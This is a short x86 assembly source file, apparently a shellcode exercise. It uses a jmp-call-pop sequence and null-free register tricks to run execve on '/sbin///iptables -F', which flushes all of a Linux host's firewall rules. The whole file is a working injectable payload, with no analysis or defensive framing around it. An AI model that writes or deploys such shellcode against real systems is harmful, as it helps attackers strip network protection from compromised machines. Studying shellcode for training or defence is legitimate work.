global _start

section .text

_start:

    jmp setter

begin:
    xor ebx, ebx        ; set ebx to zero 
    mul bx              ; mul eax by zero. edx and eax are 0 
    pop ebx             ; ebx = (*)(str) /sbin///iptables
    push edx            ; push 0 to the stack 
    push WORD  0x462d   ; push 0x462d ('-F') to the stack 
    mov eax, esp        ; eax = (*)(str) -F
    push edx            ;push 0 to te stack
    push eax            ; push pointer to "-F"
    push ebx            ; push pointer to ///sbin/iptables/0x00
    mov ecx, esp        ; pointer to argv[] 
    push 0xb          ; execve syscall 
    pop eax 
    int 0x80            ; call execve 
    

setter:
    call begin
    string: db "/sbin///iptables",  0 
